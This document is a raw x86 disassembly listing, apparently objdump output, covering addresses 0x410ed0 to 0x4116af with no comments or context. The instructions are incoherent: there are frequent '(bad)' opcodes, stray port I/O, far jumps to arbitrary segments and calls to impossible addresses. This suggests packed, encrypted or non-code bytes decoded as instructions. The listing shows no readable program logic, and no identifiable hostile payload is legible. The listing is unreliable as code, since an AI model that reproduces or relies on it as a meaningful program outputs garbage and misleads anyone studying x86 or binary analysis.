  410ed0:	mov    edi,0xefcd7cc
  410ed5:	inc    esp
  410ed6:	clc    
  410ed7:	in     eax,0xa8
  410ed9:	outs   dx,BYTE PTR ds:[esi]
  410eda:	aad    0x7c
  410edc:	and    cl,BYTE PTR [eax+0x220af67e]
  410ee2:	inc    edx
  410ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ee4:	jae    0x410ec9
  410ee6:	repz cwde 
  410ee8:	call   0xa97f84f8
  410eed:	dec    esi
  410eee:	enter  0x1ba2,0x59
  410ef2:	ins    DWORD PTR es:[edi],dx
  410ef3:	cdq    
  410ef4:	mov    ecx,0xc57344ce
  410ef9:	psubd  mm0,mm0
  410efc:	xchg   ecx,eax
  410efd:	mov    ebx,0xc4bd09ab
  410f02:	xor    al,0xdd
  410f04:	mov    eax,0x2618e3dc
  410f09:	xchg   ecx,eax
  410f0a:	or     eax,0x339341d3
  410f0f:	sahf   
  410f10:	pop    ds
  410f11:	mov    fs,WORD PTR [ebp-0x3bc9a8f6]
  410f17:	dec    edx
  410f18:	sub    eax,0x77162620
  410f1d:	pop    ebx
  410f1e:	(bad)  
  410f1f:	fist   DWORD PTR [edx]
  410f21:	xor    bh,BYTE PTR [ebp+0x38]
  410f24:	xor    BYTE PTR [ecx+ebx*1],bh
  410f27:	mov    ch,BYTE PTR [eax+0x72]
  410f2a:	(bad)  
  410f2b:	(bad)  [edx+0x1ba1c78c]
  410f31:	cmc    
  410f32:	lods   eax,DWORD PTR ds:[esi]
  410f33:	int3   
  410f34:	xor    al,0xbc
  410f36:	push   edx
  410f37:	jmp    DWORD PTR [ebx-0x50]
  410f3a:	mov    bl,BYTE PTR [esi]
  410f3c:	fiadd  DWORD PTR [edx-0x21]
  410f3f:	push   ebp
  410f40:	cwde   
  410f41:	mov    eax,ebx
  410f43:	mov    al,0xf0
  410f45:	in     al,0x31
  410f47:	inc    esp
  410f48:	cld    
  410f49:	xchg   ebx,eax
  410f4a:	sub    cl,BYTE PTR [ebx-0x52010ca0]
  410f50:	sub    cl,BYTE PTR [esi+0x25134d3b]
  410f56:	in     al,dx
  410f57:	mov    cl,0xd0
  410f59:	test   BYTE PTR [edx],cl
  410f5b:	into   
  410f5c:	rol    ah,0x26
  410f5f:	inc    ecx
  410f60:	xchg   ebp,eax
  410f61:	pop    ebp
  410f62:	cmp    edi,DWORD PTR [ebx-0x413466b2]
  410f68:	mov    bh,0x7e
  410f6a:	cmp    DWORD PTR [edi+0x269acff5],edi
  410f70:	gs or  eax,0xd7ba280a
  410f76:	daa    
  410f77:	or     eax,0x49ee7de4
  410f7c:	mov    ecx,0x39ca2aba
  410f81:	lods   eax,DWORD PTR ds:[esi]
  410f82:	sub    dl,cl
  410f84:	cli    
  410f85:	outs   dx,DWORD PTR ds:[esi]
  410f86:	das    
  410f87:	(bad)  
  410f88:	mov    dh,0xd7
  410f8a:	push   eax
  410f8b:	(bad)  
  410f8c:	retf   0x1c35
  410f8f:	mov    al,ds:0x61229c4b
  410f94:	add    eax,0xec067b9d
  410f99:	cmp    esp,0x7f208dec
  410f9f:	es jne 0x410f25
  410fa2:	je     0x410f2e
  410fa4:	outs   dx,BYTE PTR ds:[esi]
  410fa5:	jmp    0xeecb:0xa246a40d
  410fac:	mov    esi,0xf67e00c4
  410fb1:	inc    ebx
  410fb2:	test   eax,0x6488660e
  410fb7:	xor    BYTE PTR [edx+0x48807eeb],0x7
  410fbe:	sub    dh,dl
  410fc0:	or     edx,DWORD PTR [bx+di]
  410fc3:	mov    BYTE PTR [ebx],al
  410fc5:	iret   
  410fc6:	mov    ds:0xff76f901,al
  410fcb:	pop    eax
  410fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fcd:	test   eax,0x43c8e7d8
  410fd2:	xchg   ebx,eax
  410fd3:	in     eax,dx
  410fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fd5:	js     0x410f79
  410fd7:	(bad)  
  410fd9:	pop    ds
  410fda:	cmp    ch,dh
  410fdc:	call   0x75ddc8c6
  410fe1:	das    
  410fe2:	daa    
  410fe3:	repnz adc dh,al
  410fe6:	mov    esp,0x90f56a8a
  410feb:	mov    bl,0x28
  410fed:	mov    ?,esi
  410fef:	jle    0x410fd5
  410ff1:	ret    0xedc9
  410ff4:	dec    eax
  410ff5:	xchg   DWORD PTR [ebp+0x73495e9],edx
  410ffb:	inc    edx
  410ffc:	in     eax,0xac
  410ffe:	dec    edi
  410fff:	enter  0xc5a4,0x78
  411003:	fstp   st(3)
  411005:	(bad)
  411008:	call   0xbe28:0xf27f5202
  41100f:	sub    cl,ah
  411011:	test   al,0xbe
  411013:	mov    dl,0x34
  411015:	inc    ebx
  411016:	nop
  411017:	add    al,0xe7
  411019:	and    BYTE PTR [edx],bl
  41101b:	adc    eax,DWORD PTR [ebx+0x69]
  41101e:	push   ds
  41101f:	add    DWORD PTR [edi],esi
  411021:	leave  
  411022:	jne    0x411073
  411024:	pop    esi
  411025:	scas   al,BYTE PTR es:[edi]
  411026:	mov    edi,0xafbb428f
  41102b:	xchg   ebp,eax
  41102c:	out    dx,al
  41102d:	jnp    0x410fca
  41102f:	dec    edx
  411030:	mov    ebp,0xd54dd7aa
  411035:	js     0x411016
  411037:	lahf   
  411038:	out    dx,al
  411039:	or     DWORD PTR [esp+edx*1-0xc],esi
  41103d:	jmp    0x181e:0x353d638
  411044:	inc    ebp
  411045:	dec    eax
  411046:	jecxz  0x411078
  411048:	into   
  411049:	and    ah,BYTE PTR [edx-0x4b065658]
  41104f:	jle    0x41108b
  411051:	mov    ds:0x1a64cc17,eax
  411056:	push   ecx
  411057:	in     eax,0x79
  411059:	ins    DWORD PTR es:[edi],dx
  41105a:	aad    0xca
  41105c:	pop    ds
  41105d:	test   DWORD PTR [edi+eiz*4-0xc],esi
  411061:	mov    dh,0x68
  411063:	retf   0x1553
  411066:	jecxz  0x411043
  411068:	mov    esi,DWORD PTR [ebp+0x27]
  41106b:	or     DWORD PTR [eax-0x1843c1af],edi
  411071:	out    0xd9,eax
  411073:	js     0x411008
  411075:	or     al,BYTE PTR [eax]
  411077:	mov    ch,0x9a
  411079:	iret   
  41107a:	push   edi
  41107b:	pop    es
  41107c:	xchg   ebp,eax
  41107d:	sub    ebp,DWORD PTR [esi]
  41107f:	jae    0x4110a9
  411081:	mov    edx,0x6ca2a6eb
  411086:	lahf   
  411087:	mov    ah,0x74
  411089:	push   0x9
  41108b:	ins    DWORD PTR es:[edi],dx
  41108c:	jb     0x4110e8
  41108e:	add    dl,BYTE PTR [ecx]
  411090:	mov    ah,0x23
  411092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411093:	cmp    ch,BYTE PTR [edx]
  411095:	fisttp WORD PTR [esi+ebp*2]
  411098:	jmp    0x9a24fc38
  41109d:	jmp    0x818a34e4
  4110a2:	mov    ds:0x2d061398,eax
  4110a7:	rcl    DWORD PTR [ebx+edx*4+0x33e7c317],cl
  4110ae:	push   es
  4110af:	in     al,dx
  4110b0:	enter  0x6f73,0x6a
  4110b4:	mov    ds:0x61a6e81,eax
  4110b9:	pop    edi
  4110ba:	cmp    ecx,DWORD PTR [edx+0x118ccb90]
  4110c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110c1:	xor    DWORD PTR fs:[ecx-0x5d55fc61],0xffffff9c
  4110c9:	or     eax,0xe07a8047
  4110ce:	or     al,0x3b
  4110d0:	and    ah,BYTE PTR [esi+0x33081eb4]
  4110d6:	test   eax,0xe1bd9574
  4110db:	cmp    al,0x3d
  4110dd:	mov    edx,0xe7ac58e9
  4110e3:	shl    bl,1
  4110e5:	mov    ds:0xe755d712,eax
  4110ea:	adc    eax,0x33e4b557
  4110ef:	cwde   
  4110f0:	icebp  
  4110f1:	jge    0x411094
  4110f3:	jns    0x41114f
  4110f5:	(bad)  
  4110f6:	and    BYTE PTR [eax],dl
  4110f8:	pusha  
  4110f9:	lods   eax,DWORD PTR ds:[esi]
  4110fa:	push   ebx
  4110fb:	pop    esp
  4110fc:	rcr    BYTE PTR [eax+0x75eb0e4d],cl
  411102:	mov    eax,ds:0x9e27f9d7
  411107:	call   0x76d8320a
  41110c:	daa    
  41110d:	cmp    DWORD PTR [eax+0x312318c6],ebx
  411113:	adc    dl,al
  411115:	loope  0x411127
  411117:	and    ebp,DWORD PTR [esp+esi*4+0x16d7f2f7]
  41111e:	xchg   esi,eax
  41111f:	pop    ds
  411120:	mul    ebp
  411122:	sbb    eax,0xf12ab4bf
  411127:	cs (bad) 
  411129:	clc    
  41112a:	ret    
  41112b:	xchg   BYTE PTR [ebx+ecx*1],ah
  41112e:	fsubrp st(6),st
  411130:	cmp    DWORD PTR [edx+0x32808078],0x48338deb
  41113a:	mov    bh,dl
  41113c:	add    al,0x44
  41113e:	lods   eax,DWORD PTR ds:[esi]
  41113f:	jbe    0x4110eb
  411141:	scas   al,BYTE PTR es:[edi]
  411142:	mov    ebp,0x79cc5507
  411147:	ins    DWORD PTR es:[edi],dx
  411148:	xchg   ch,ch
  41114a:	rcl    DWORD PTR [edx-0x3f],1
  41114d:	push   ebx
  41114e:	outs   dx,DWORD PTR ds:[esi]
  41114f:	cli    
  411150:	imul   esi,ebp,0x5b
  411153:	adc    al,0xc1
  411155:	ja     0x4110e7
  411157:	pop    ecx
  411158:	cdq    
  411159:	imul   ebp,DWORD PTR [ecx+0x22],0xff429b61
  411160:	neg    DWORD PTR [edi+0x7f17e591]
  411166:	pop    esp
  411167:	xor    al,0xd6
  411169:	sbb    eax,DWORD PTR [esp+0x39]
  41116d:	mov    al,0x7d
  41116f:	dec    esi
  411170:	mov    al,ds:0xc08ea09b
  411175:	mov    cl,0xcb
  411177:	cmp    al,0x35
  411179:	dec    edi
  41117a:	push   DWORD PTR [esi+ebx*8]
  41117d:	jecxz  0x4111e0
  41117f:	cmp    BYTE PTR [eax],0xff
  411182:	push   ss
  411183:	cmp    al,BYTE PTR [edi]
  411185:	xchg   DWORD PTR [ebx+0x2ccaa874],ebp
  41118b:	imul   ebp,DWORD PTR [ecx+0x38fb256e],0x49
  411192:	ins    DWORD PTR es:[edi],dx
  411193:	pop    edx
  411194:	push   ss
  411195:	dec    esi
  411196:	aad    0xd3
  411198:	fs cs aas 
  41119b:	mov    esp,0x1de6e114
  4111a0:	dec    esp
  4111a1:	and    al,0xc9
  4111a3:	and    cl,BYTE PTR [ebx+esi*2+0x7b3c82dc]
  4111aa:	lds    esi,FWORD PTR ds:0x612f0266
  4111b0:	sbb    ch,bh
  4111b2:	clc    
  4111b3:	aaa    
  4111b4:	sahf   
  4111b5:	fs (bad) 
  4111b7:	packuswb mm4,mm7
  4111ba:	cmc    
  4111bb:	cmp    ch,BYTE PTR [esi+0x64]
  4111be:	dec    ebx
  4111bf:	fwait
  4111c0:	jbe    0x4111b2
  4111c2:	repz mov ah,bh
  4111c5:	xchg   ebx,eax
  4111c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c7:	and    ch,BYTE PTR [edx+0x2f]
  4111ca:	popw   es
  4111cc:	sbb    BYTE PTR ds:0x871e2b3f,ah
  4111d2:	popf   
  4111d3:	cmp    DWORD PTR [ebx-0x72],edi
  4111d6:	or     edi,ecx
  4111d8:	outs   dx,DWORD PTR ds:[esi]
  4111d9:	add    eax,0x9b16e432
  4111de:	scas   al,BYTE PTR es:[edi]
  4111df:	ds loope 0x411260
  4111e2:	repz adc esp,esi
  4111e5:	xchg   BYTE PTR [ebx],dl
  4111e7:	xor    DWORD PTR [edi],ebp
  4111e9:	add    dl,al
  4111eb:	and    dl,BYTE PTR [ebp+0x20ee4606]
  4111f1:	fstp   DWORD PTR [eax+edi*2+0x61]
  4111f5:	ss cmp al,0x0
  4111f8:	cmp    al,0xcb
  4111fa:	mov    dh,0xa6
  4111fc:	les    ebx,FWORD PTR [esi+0x4da66e1c]
  411202:	jecxz  0x4111c5
  411204:	sbb    DWORD PTR [edi-0x6],esp
  411207:	push   ss
  411208:	or     eax,0xee4f2a8e
  41120d:	ficom  DWORD PTR [esi]
  41120f:	ret    
  411210:	outs   dx,DWORD PTR ds:[esi]
  411211:	or     DWORD PTR [eax-0x6c77f850],ebp
  411217:	add    cl,BYTE PTR [esi-0x54]
  41121a:	cld    
  41121b:	adc    cl,BYTE PTR [eax+0x53]
  41121e:	lods   al,BYTE PTR ds:[esi]
  41121f:	or     cl,BYTE PTR [edi+0x30c2ee26]
  411225:	and    ecx,DWORD PTR [ebx-0x57]
  411228:	mov    ebp,0x6a849ba7
  41122d:	or     DWORD PTR [edi+esi*8+0x62a07eb5],ebp
  411234:	add    ecx,DWORD PTR [ecx+eax*8-0x78]
  411238:	push   es
  411239:	mov    eax,0xa7d277c1
  41123e:	jl     0x411254
  411240:	mov    al,ds:0x7236c6fe
  411245:	mov    dl,0x1c
  411247:	iret   
  411248:	jcxz   0x4112ba
  41124b:	test   eax,0x11dccfa3
  411250:	imul   ecx,DWORD PTR [edi+0x61],0x1ccb8acc
  411257:	retf   0x3c87
  41125a:	sti    
  41125b:	and    ah,dl
  41125d:	sub    DWORD PTR ds:0x6894983c,esp
  411263:	dec    eax
  411264:	push   ebx
  411265:	ror    DWORD PTR [ebx+0x18],0x89
  411269:	or     DWORD PTR ds:0x96da6507,eax
  41126f:	lahf   
  411270:	or     ebx,DWORD PTR [edx+0x6a90cd24]
  411276:	dec    ebx
  411277:	les    ebp,FWORD PTR [ebx+0x25771e7c]
  41127d:	or     ecx,DWORD PTR [eax+0x7ed68c34]
  411283:	cmp    ebp,ebx
  411285:	pop    ds
  411286:	out    0x84,al
  411288:	and    eax,0x60
  41128b:	jae    0x4112d9
  41128d:	mov    es,WORD PTR [eax]
  41128f:	out    dx,eax
  411290:	pop    ecx
  411291:	dec    ebx
  411292:	jbe    0x41123d
  411294:	jp     0x4112a6
  411296:	rol    DWORD PTR [ecx+0x14],1
  411299:	jp     0x411270
  41129b:	dec    ecx
  41129c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41129d:	mov    dl,dh
  41129f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a0:	cmp    DWORD PTR [ecx+0x308a20d],edi
  4112a6:	les    ebp,FWORD PTR [esi+esi*1-0x18]
  4112aa:	out    dx,eax
  4112ab:	enter  0xfa19,0xf7
  4112af:	or     eax,0x65d50d25
  4112b4:	mov    ebx,0x330d499f
  4112b9:	mov    eax,ds:0x8fb5ca3b
  4112be:	inc    ebp
  4112bf:	xor    DWORD PTR [edi],ebp
  4112c1:	test   DWORD PTR [esp+ebx*1+0x14],ebp
  4112c5:	dec    ebp
  4112c6:	cmp    eax,0xc73e107d
  4112cb:	xchg   ebx,esp
  4112cd:	xlat   BYTE PTR ds:[ebx]
  4112ce:	mov    al,0xc1
  4112d0:	dec    esi
  4112d1:	aam    0x6c
  4112d3:	loope  0x411325
  4112d5:	xchg   edi,eax
  4112d6:	jecxz  0x4112ee
  4112d8:	xchg   ebx,eax
  4112d9:	mov    esi,0xbe371278
  4112de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112df:	push   0xffffffbb
  4112e1:	jp     0x41127a
  4112e3:	(bad)  
  4112e5:	push   ss
  4112e6:	mov    bl,0x27
  4112e8:	enter  0x8faa,0x49
  4112ec:	ds cmp al,0x28
  4112ef:	inc    ebp
  4112f0:	(bad)  [edi-0x16254acb]
  4112f6:	or     dh,BYTE PTR [ebp+0x3b]
  4112f9:	lods   al,BYTE PTR ds:[esi]
  4112fa:	or     eax,0x461bc839
  4112ff:	inc    esi
  411300:	(bad)  
  411301:	sub    ecx,DWORD PTR [edi]
  411303:	outs   dx,BYTE PTR ds:[esi]
  411304:	nop
  411305:	les    ebp,FWORD PTR [ecx+0x7a62b360]
  41130b:	pop    ss
  41130c:	loope  0x411360
  41130e:	pop    ebp
  41130f:	es dec eax
  411311:	xchg   edi,eax
  411312:	jbe    0x411343
  411314:	loop   0x411373
  411316:	out    dx,al
  411317:	pop    edx
  411318:	xor    BYTE PTR [ebp+0x67a28a52],ah
  41131e:	outs   dx,BYTE PTR ds:[esi]
  41131f:	mov    dh,0xa6
  411321:	adc    DWORD PTR [ecx],edi
  411323:	push   cs
  411324:	adc    al,0x98
  411326:	sbb    BYTE PTR [edx],ah
  411328:	push   edx
  411329:	add    eax,0x7bfba46b
  41132e:	jmp    0x96b:0xec366c56
  411335:	fwait
  411336:	add    BYTE PTR [eax+0x56981d9c],bl
  41133c:	mov    ebp,0xf534898f
  411341:	enter  0xcb8,0x8e
  411345:	jp     0x4112e9
  411347:	lds    ebx,FWORD PTR [edi+0x37]
  41134a:	or     edx,edi
  41134c:	mov    eax,0x74eb8f38
  411351:	mov    dl,0xeb
  411353:	pushf  
  411354:	or     eax,DWORD PTR [edx]
  411356:	pop    edi
  411357:	sbb    DWORD PTR [eax+0x1ab0aa0a],0xd27a13c0
  411361:	xor    cl,bh
  411363:	cli    
  411364:	out    dx,eax
  411365:	out    0xbd,eax
  411367:	mov    al,ds:0x32d4a0d2
  41136c:	push   edi
  41136d:	mov    ch,BYTE PTR [ebx+0x530079f8]
  411373:	aaa    
  411374:	mov    dl,0x4b
  411376:	ds push esp
  411378:	cmp    BYTE PTR [esi-0x6ccf407e],al
  41137e:	aaa    
  41137f:	jmp    0x2c4b4f2b
  411384:	fisttp DWORD PTR [ebx-0x4a]
  411387:	sbb    eax,0x7e05a136
  41138c:	or     al,0xba
  41138e:	cmp    cx,WORD PTR [esi+0x78cb52ef]
  411395:	rol    ebx,0x40
  411398:	stos   BYTE PTR es:[edi],al
  411399:	mov    DWORD PTR [esi+0x2a4b8b54],esp
  41139f:	scas   eax,DWORD PTR es:[edi]
  4113a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a1:	adc    ebp,DWORD PTR [ebx]
  4113a3:	push   eax
  4113a4:	pop    esp
  4113a5:	hlt    
  4113a6:	xor    BYTE PTR ds:0x677ff212,bh
  4113ac:	sub    esp,DWORD PTR [edx+0x610a5910]
  4113b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113b3:	call   0xea4b678b
  4113b8:	fistp  WORD PTR [edi+0x32d98cc7]
  4113be:	loope  0x4113e0
  4113c0:	lock in al,0x51
  4113c3:	in     al,0x97
  4113c5:	inc    esp
  4113c6:	rol    BYTE PTR [eax+edi*8],0x8e
  4113ca:	add    eax,0xce5aa52f
  4113cf:	pop    es
  4113d0:	hlt    
  4113d1:	xchg   edi,eax
  4113d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113d3:	or     ebp,DWORD PTR [esi]
  4113d5:	add    eax,0xce2365e0
  4113da:	cs mov dh,0x1a
  4113dd:	add    BYTE PTR [edi+0x38],bl
  4113e0:	js     0x4113d4
  4113e2:	pushf  
  4113e3:	cmp    DWORD PTR [edi+edi*2+0x1fd6a1c8],esp
  4113ea:	shl    esi,cl
  4113ec:	scas   eax,DWORD PTR es:[edi]
  4113ed:	aam    0x55
  4113ef:	jge    0x41142e
  4113f1:	in     eax,0xeb
  4113f3:	inc    esp
  4113f4:	pmaddwd mm4,QWORD PTR [edi]
  4113f7:	pop    eax
  4113f8:	pushf  
  4113f9:	cs out 0x4e,al
  4113fc:	ret    0x8f81
  4113ff:	mov    dl,0x3
  411401:	cmp    BYTE PTR [ebx-0x30],0x9b
  411405:	mov    ah,BYTE PTR [ebx+ecx*4+0x70db7b03]
  41140c:	lods   al,BYTE PTR ds:[esi]
  41140d:	shr    BYTE PTR [edx+edx*1-0x46],cl
  411411:	addr16 jo 0x4113b8
  411414:	out    dx,eax
  411415:	sub    eax,0x791c86b3
  41141a:	imul   DWORD PTR es:[eax]
  41141d:	daa    
  41141e:	(bad)  
  41141f:	sti    
  411420:	push   ss
  411421:	mov    ds:0xff870291,eax
  411426:	aam    0xe7
  411428:	inc    esi
  411429:	fwait
  41142a:	and    ah,BYTE PTR [eax-0x2b9a7151]
  411430:	sti    
  411431:	xchg   ebx,eax
  411432:	push   esi
  411433:	mov    eax,DWORD PTR [edx]
  411435:	std    
  411436:	mov    al,0x18
  411438:	sti    
  411439:	xchg   esp,eax
  41143a:	pusha  
  41143b:	pop    ecx
  41143c:	js     0x41147a
  41143e:	scas   eax,DWORD PTR es:[edi]
  41143f:	in     al,dx
  411440:	xchg   esp,eax
  411441:	inc    esp
  411442:	rol    DWORD PTR [ecx+edi*2-0x49],0x9e
  411447:	xchg   DWORD PTR [ecx-0xc],ebp
  41144a:	cli    
  41144b:	mov    dh,0x10
  41144d:	lahf   
  41144e:	sub    esp,0xd117a2f8
  411454:	stc    
  411455:	xchg   esi,eax
  411456:	push   cs
  411457:	jmp    0x2e593b5c
  41145c:	out    dx,al
  41145d:	pop    es
  41145e:	aaa    
  41145f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411460:	xchg   esi,eax
  411461:	scas   al,BYTE PTR es:[edi]
  411462:	cmp    DWORD PTR [edx+0x21597dce],0x51
  411469:	dec    esi
  41146a:	ret    
  41146b:	adc    bh,ch
  41146d:	and    ch,BYTE PTR [esi-0x770ddaff]
  411473:	dec    esi
  411474:	push   0x236c8b09
  411479:	pop    ebp
  41147a:	rol    esi,1
  41147c:	enter  0x4dc4,0xd1
  411480:	popf   
  411481:	mov    esi,0x9853cbc3
  411486:	test   al,0xe7
  411488:	jns    0x4114ab
  41148a:	add    eax,0x288ded9e
  41148f:	stos   BYTE PTR es:[edi],al
  411490:	push   0x63
  411492:	mov    edx,0x83ab1a72
  411497:	xchg   esi,eax
  411498:	fidivr DWORD PTR [edx-0x6b]
  41149b:	inc    edi
  41149c:	inc    ebx
  41149d:	cmp    DWORD PTR [edi-0x5b],ebx
  4114a0:	xor    eax,0x82ffd5cb
  4114a5:	clc    
  4114a6:	in     al,0xed
  4114a8:	pop    ss
  4114a9:	stc    
  4114aa:	mov    ebx,0xc78c789
  4114af:	in     al,0xa1
  4114b1:	mov    edi,0xf263b4cb
  4114b6:	jb     0x411446
  4114b8:	xor    BYTE PTR [ebp-0x3343f356],0x4e
  4114bf:	mov    al,ds:0xd2f4f033
  4114c4:	stos   BYTE PTR es:[edi],al
  4114c5:	f2xm1  
  4114c7:	mov    ds:0x385bd991,eax
  4114cc:	in     eax,0x29
  4114ce:	push   edi
  4114cf:	jbe    0x411536
  4114d1:	adc    eax,0x2ad532d4
  4114d6:	test   BYTE PTR [ebx],al
  4114d8:	loopne 0x4114a3
  4114da:	retf   0xb80c
  4114dd:	sbb    DWORD PTR [eax],eax
  4114df:	push   ebp
  4114e0:	mov    dh,0x91
  4114e2:	into   
  4114e3:	stos   BYTE PTR es:[edi],al
  4114e4:	mov    eax,0xd051f43a
  4114e9:	arpl   WORD PTR [ebp+0x52],ax
  4114ec:	xchg   esi,eax
  4114ed:	jmp    0x5e03bdb3
  4114f2:	int    0x55
  4114f4:	cdq    
  4114f5:	xor    BYTE PTR [edx],0x75
  4114f8:	int3   
  4114f9:	pop    ecx
  4114fa:	xchg   BYTE PTR [ebx+0x56b5467f],cl
  411500:	mov    dh,0x72
  411502:	stos   BYTE PTR es:[edi],al
  411503:	pusha  
  411504:	js     0x4114fe
  411506:	(bad)  
  411507:	outs   dx,DWORD PTR ds:[esi]
  411508:	out    dx,eax
  411509:	lock nop
  41150b:	ret    0x4600
  41150e:	push   ebp
  41150f:	ret    0x78a3
  411512:	sub    ebx,eax
  411514:	pop    eax
  411515:	rol    BYTE PTR [esp+ebx*8-0x5fb923d],cl
  41151c:	js     0x4114df
  41151e:	retf   
  41151f:	(bad)  
  411520:	cld    
  411521:	mov    eax,0xc0cabbc6
  411526:	or     esi,DWORD PTR [ebx-0x77]
  411529:	inc    edx
  41152a:	retf   0xed56
  41152d:	mov    bh,0xb1
  41152f:	cmp    eax,0xb558b083
  411534:	push   eax
  411535:	addr16 jbe 0x411511
  411538:	xor    al,0xff
  41153a:	adc    al,0xf2
  41153c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41153d:	adc    eax,0xb50d4e7f
  411542:	sti    
  411543:	and    DWORD PTR [edi+0x71116d81],ebx
  411549:	fwait
  41154a:	adc    DWORD PTR [edi-0x68d00dfd],ebp
  411550:	ret    0xb860
  411553:	xchg   esi,eax
  411554:	add    eax,0xee6730da
  411559:	aaa    
  41155a:	ret    0xf3a7
  41155d:	in     al,0x69
  41155f:	mov    BYTE PTR ds:0xdedf5949,dh
  411565:	stos   BYTE PTR es:[edi],al
  411566:	test   eax,0x1ca5a670
  41156b:	sub    bh,BYTE PTR [ecx+ecx*8]
  41156e:	jae    0x4115bb
  411570:	popa   
  411571:	cmp    eax,0x690f0f0b
  411576:	je     0x4115ca
  411578:	mov    DWORD PTR [ecx-0x74],ecx
  41157b:	cmp    al,0xd6
  41157d:	in     eax,0x3
  41157f:	lock cmp edi,DWORD PTR ds:0x63171b22
  411586:	adc    DWORD PTR [eax-0x116e9ccf],ecx
  41158c:	pop    ebx
  41158d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41158e:	iret   
  41158f:	push   es
  411590:	ins    BYTE PTR es:[edi],dx
  411591:	or     eax,0x6e588b23
  411596:	scas   al,BYTE PTR es:[edi]
  411597:	outs   dx,BYTE PTR ds:[esi]
  411598:	sbb    BYTE PTR [ebp-0x77aef08d],dl
  41159e:	popf   
  41159f:	lahf   
  4115a0:	sbb    BYTE PTR ds:0x206857ee,cl
  4115a6:	rol    DWORD PTR [edx+esi*2-0x18],1
  4115aa:	add    DWORD PTR [edi],edx
  4115ac:	dec    ebp
  4115ad:	sub    BYTE PTR [edi+0x6a],cl
  4115b0:	ins    BYTE PTR es:[edi],dx
  4115b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b2:	mul    BYTE PTR [edx]
  4115b4:	or     eax,ebp
  4115b6:	ds in  eax,dx
  4115b8:	fcmovnu st,st(5)
  4115ba:	sub    eax,DWORD PTR [eax-0x2209bc55]
  4115c0:	ins    BYTE PTR es:[edi],dx
  4115c1:	dec    ebp
  4115c2:	xchg   edi,eax
  4115c3:	jle    0x41161e
  4115c5:	outs   dx,BYTE PTR ds:[esi]
  4115c6:	adc    esi,esp
  4115c8:	pop    ds
  4115c9:	pushf  
  4115ca:	fdiv   QWORD PTR [eax-0x2d]
  4115cd:	xchg   esp,eax
  4115ce:	push   esp
  4115cf:	fcomip st,st(3)
  4115d1:	jmp    0x28dff082
  4115d6:	in     al,dx
  4115d7:	sbb    eax,0x4006185c
  4115dc:	retf   0xe7b6
  4115df:	push   0x49e3a676
  4115e4:	shl    DWORD PTR gs:[ebx],1
  4115e7:	in     al,dx
  4115e8:	out    dx,eax
  4115e9:	inc    ebp
  4115ea:	lds    eax,FWORD PTR [edx]
  4115ec:	ret    
  4115ed:	mov    ch,0xf
  4115ef:	stc    
  4115f0:	jmp    0x41162b
  4115f2:	ret    
  4115f3:	jp     0x411581
  4115f5:	aaa    
  4115f6:	sbb    edx,edi
  4115f8:	sahf   
  4115f9:	out    0x2,al
  4115fb:	repz inc esi
  4115fd:	cmc    
  4115fe:	sti    
  4115ff:	retf   0x5e7b
  411602:	std    
  411603:	jle    0x4115a3
  411605:	ret    
  411606:	jnp    0x41162e
  411608:	jb     0x41159c
  41160a:	add    dl,BYTE PTR [ebp+0x6]
  41160d:	(bad)  
  41160e:	cwde   
  41160f:	out    dx,al
  411610:	mov    ecx,0xe60df1bd
  411615:	push   ebp
  411616:	outs   dx,BYTE PTR ds:[esi]
  411617:	pop    ss
  411618:	mov    BYTE PTR [esi+ebp*2-0x67],dl
  41161c:	fst    QWORD PTR [ecx-0x1d]
  41161f:	mov    al,ds:0xfc78e11b
  411624:	mov    ah,0x4d
  411626:	push   ss
  411627:	mov    eax,ds:0xea0ba51b
  41162c:	mov    al,0xf1
  41162e:	inc    esp
  41162f:	popa   
  411630:	dec    ebx
  411631:	jns    0x411698
  411633:	shr    DWORD PTR [eax],1
  411635:	mov    ebp,0x81675c5a
  41163a:	mov    ds:0x9ca8410a,al
  41163f:	mov    ah,0x24
  411641:	pop    edx
  411642:	ret    
  411643:	fnstenv [eax]
  411645:	arpl   di,dx
  411647:	adc    ah,BYTE PTR [edx]
  411649:	xor    dl,BYTE PTR [esi+0x67]
  41164c:	fsubp  st(4),st
  41164e:	fisub  DWORD PTR [ecx-0x23]
  411651:	scas   al,BYTE PTR es:[edi]
  411652:	cmp    ecx,ecx
  411654:	test   eax,0x25fb0a6d
  411659:	addr16 pop ecx
  41165b:	test   BYTE PTR [eax+0x7e],ch
  41165e:	adc    eax,0xbc09cd2
  411663:	lock dec ebx
  411665:	mov    ch,0x23
  411667:	fwait
  411668:	ret    0x7507
  41166b:	fdivr  QWORD PTR [edi]
  41166d:	and    eax,0x2c1ffab7
  411672:	shl    DWORD PTR [ebp+0x808e260],0x61
  411679:	mov    edi,0xc3eaf36
  41167e:	(bad)  
  41167f:	xor    ecx,DWORD PTR [ebx]
  411681:	div    DWORD PTR [esi]
  411683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411684:	(bad)  
  411685:	jge    0x41169b
  411687:	pop    esi
  411688:	adc    BYTE PTR [edx-0x59e7a614],cl
  41168e:	fwait
  41168f:	shl    DWORD PTR [ecx+0x2c68eb8c],1
  411695:	adc    DWORD PTR [esi+0x75de619a],0xffffff8d
  41169c:	retf   
  41169d:	sbb    ecx,DWORD PTR [esi+0x360284b7]
  4116a3:	push   0xfffffff0
  4116a5:	ins    DWORD PTR es:[edi],dx
  4116a6:	aas    
  4116a7:	xchg   ecx,eax
  4116a8:	adc    BYTE PTR [ebx-0x161f19e1],0xf9
  4116af:	and    al,0xb0
